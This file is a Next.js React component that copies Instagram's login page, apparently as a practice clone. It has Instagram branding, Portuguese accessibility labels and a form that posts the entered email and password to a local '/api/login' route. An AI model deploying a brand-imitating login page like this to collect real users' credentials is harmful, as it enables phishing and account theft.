"use client"
import React from "react";
import "./globals.css";
import axios from "axios";



export default function Home() {

  const[data, setData] = React.useState({
    email:"",
    password:""
  });

  const handleSubmit = async (e) => {
    e.preventDefault();

      try {
      const response=await axios.post("/api/login", data);
      console.log(response.data);
    } catch (error) {
      console.log(error);
    }
  }
  return (
    <>
      <main className="flex align-items-center justify-content-center">
        <section id="mobile" className="flex"></section>

        <section id="auth" className="flex direction-column">
          <div className="panel login flex direction-column">
            <h1 title="Instagram" className="flex justify-content-center">
              <img
                src="/img/instagram-logo.png"
                alt="Instagram logo"
                title="Instagram logo"
              />
            </h1>

            <form onSubmit={handleSubmit}>
              <label htmlFor="email" className="sr-only">
                Telefone, nome de usuário ou e-mail
              </label>

              <input
                name="email"
                value={data.email}
                onChange={(e) => setData({...data, email: e.target.value})}
                placeholder="Phone number, username, or email"
              />

              <label htmlFor="password" className="sr-only">
                Senha
              </label>

              <input
              name="password"
              type="password"
              value={data.password}
              onChange={(e) => setData({...data, password: e.target.value})}
              placeholder="Password" />

              <button type="submit">Log In</button>
            </form>

            <div className="flex separator align-items-center">
              <span></span>

              <div className="or">OR</div>

              <span></span>
            </div>

            <div className="login-with-fb flex direction-column align-items-center">
              <div>
                <img src="/img/facebook-icon.jpg" />

                <a>Log in with Facebook</a>
              </div>

              <a href="#">Forgot password?</a>
            </div>
          </div>

          <div className="panel register flex justify-content-center">
            <p>Don't have an account?</p>

            <a href="#">Sign up</a>
          </div>

          <div className="app-download flex direction-column align-items-center">
            <p>Get the app.</p>

            <div className="flex justify-content-center">
              <img
                src="/img/apple-button.png"
                alt="Apple Store"
                title="Apple Store"
              />

              <img
                src="/img/googleplay-button.png"
                alt="Google Play"
                title="Google Play"
              />
            </div>
          </div>
        </section>
      </main>
    </>
  );
}
